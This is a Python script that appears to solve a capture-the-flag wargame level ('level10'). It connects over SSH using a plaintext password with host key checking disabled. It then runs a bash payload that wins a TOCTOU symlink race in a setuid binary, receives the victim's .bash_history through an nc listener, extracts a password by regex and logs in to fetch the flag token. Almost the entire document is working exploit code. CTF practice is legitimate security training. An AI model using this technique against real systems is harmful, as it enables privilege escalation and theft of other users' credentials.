"""Level 10 TOCTOU Race Condition Exploit"""

import subprocess
import sys


def ssh_cmd(host, port, user, pwd, cmd, timeout=10):
    """Execute SSH command."""
    try:
        result = subprocess.run(
            [
                "sshpass",
                "-p",
                pwd,
                "ssh",
                "-o",
                "StrictHostKeyChecking=no",
                "-p",
                str(port),
                f"{user}@{host}",
                cmd,
            ],
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Timeout"
    except Exception:
        return -1, "", ""


def exploit_race_condition(host, port, user, pwd):
    """Execute TOCTOU race condition to read .bash_history."""
    print(f"[*] Running TOCTOU race condition exploit...")

    bash_exploit = r"""#!/bin/bash
cd /var/tmp
rm -f link dummy /tmp/captured

echo "dummy" > dummy
ln -s dummy link

timeout 300 nc -l -p 6969 > /tmp/captured 2>/dev/null &
LISTENER_PID=$!
sleep 0.1

(while true; do ln -sf /home/user/level10/.bash_history link 2>/dev/null; done) &
SWITCHER_PID=$!

for attempt in {1..1000}; do
  ln -sf dummy link 2>/dev/null
  /home/user/level10/level10 link 127.0.0.1 >/dev/null 2>&1 &
  wait $! 2>/dev/null

  if [ -s /tmp/captured ]; then
    SIZE=$(wc -c < /tmp/captured 2>/dev/null || echo 0)
    if [ $SIZE -gt 500 ]; then
      kill $SWITCHER_PID $LISTENER_PID 2>/dev/null
      cat /tmp/captured
      exit 0
    fi
  fi

  if [ $((attempt % 100)) -eq 0 ]; then
    SIZE=$(wc -c < /tmp/captured 2>/dev/null || echo 0)
    echo "[*] Attempt $attempt/1000, captured: $SIZE bytes"
  fi
done

kill $SWITCHER_PID $LISTENER_PID 2>/dev/null
wait 2>/dev/null

if [ -s /tmp/captured ]; then
  cat /tmp/captured
  exit 0
fi

exit 1
"""

    code, out, err = ssh_cmd(host, port, user, pwd, bash_exploit, timeout=320)

    if code == 0 and out:
        return True, out
    return False, out + err


def extract_password(captured_data):
    """Extract password from captured bash history."""
    import re

    patterns = [
        r"woupa2[a-z0-9]+",
        r"Password[:\s]+([a-z0-9]+)",
    ]

    for pattern in patterns:
        match = re.search(pattern, captured_data, re.IGNORECASE)
        if match:
            if "woupa" in match.group(0).lower():
                return match.group(0)
            return match.group(1) if match.lastindex else match.group(0)

    for word in captured_data.split():
        if len(word) == 25 and word.isalnum():
            return word
    return None


def main():
    print("[*] Level 10 TOCTOU Race Condition Exploit\n")

    try:
        with open("level09/flag") as f:
            level10_pwd = f.read().strip()
    except Exception:
        print("[!] Could not read level09/flag")
        return 1

    print(f"[*] Testing connection to level10...")
    code, out, err = ssh_cmd("localhost", 4242, "level10", level10_pwd, "id")
    if code != 0:
        print(f"[!] Failed to connect to level10: {err}")
        return 1
    print(f"[+] Connected: {out.strip()}\n")

    success, captured = exploit_race_condition("localhost", 4242, "level10", level10_pwd)

    if not success:
        print("[-] Race condition exploit failed or timed out")
        print("[*] This exploit requires precise timing and may not work in all environments")
        return 1

    print(f"\n[*] Captured data length: {len(captured)} bytes")
    flag10_pwd = extract_password(captured)

    if not flag10_pwd:
        print("[-] Could not extract password from captured data")
        return 1

    print(f"[+] Extracted password: {flag10_pwd}\n")

    print(f"[*] Attempting login as flag10...")
    code, out, err = ssh_cmd("localhost", 4242, "flag10", flag10_pwd, "getflag")

    if code == 0 and "token" in out.lower():
        print(f"[+] Success!\n{out}")
        token = out.split(":")[-1].strip()

        print("\n[SUMMARY]")
        print(f"  Vulnerability: TOCTOU race condition in setuid binary")
        print(f"  Attack: Symlink swap between access() and open()")
        print(f"  Result: Read /home/user/level10/.bash_history\n")
        print(f"[ANSWER]")
        print(f"  Flag10 Password: {flag10_pwd}")
        print(f"  Level10 Token: {token}")
        return 0
    else:
        print(f"[-] Failed to authenticate as flag10")
        return 1


if __name__ == "__main__":
    sys.exit(main())
